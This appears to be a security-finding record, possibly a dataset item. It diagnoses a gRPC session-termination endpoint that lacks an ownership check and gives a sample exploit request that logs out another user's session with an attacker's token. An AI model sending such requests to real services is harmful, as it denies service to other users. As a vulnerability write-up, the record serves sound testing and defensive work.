diagnosis: The gRPC servicer terminates a session token in Redis by request.session_id without checking whether the session being terminated belongs to caller.user_id. An authenticated caller can invalidate other users' active sessions, causing widespread denial of service.
exploit_request:
POST /auth.SessionService/TerminateSession HTTP/2.0
Host: grpc.example.com
Content-Type: application/grpc
TE: trailers
authorization: Bearer <attacker_token>

[gRPC payload: session_id: "sess_tok_991823"]
